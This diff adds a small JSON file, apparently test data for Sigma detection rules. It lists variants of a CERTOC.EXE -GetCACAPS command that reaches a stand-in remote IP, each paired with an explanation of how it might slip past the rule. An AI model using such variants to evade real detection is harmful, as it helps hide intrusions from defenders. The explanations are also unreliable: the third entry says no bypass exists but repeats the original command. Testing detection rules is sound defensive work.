@@ -1,0 +1,14 @@
+[
+  {
+    "output": "CERTOC.EXE -GetCACAPS \"http://203.0.113.50/CertSrv/\"",
+    "explanation": "Insertion: Added quotes around the URL. The Sigma rule matches on the URL pattern in the CommandLine field, but adding quotes may not be detected by some parsers, potentially bypassing the rule."
+  },
+  {
+    "output": "CERTOC.EXE -GetCACAPS http://203.0.113.50/CertSrv/ -dummy",
+    "explanation": "Insertion: Added a dummy argument. The Sigma rule checks for '-GetCACAPS' and the IP-based URL, but adding an extra argument may not affect the detection logic if the parser ignores it."
+  },
+  {
+    "output": "CERTOC.EXE -GetCACAPS http://203.0.113.50/CertSrv/",
+    "explanation": "No safe bypass command can be generated."
+  }
+]
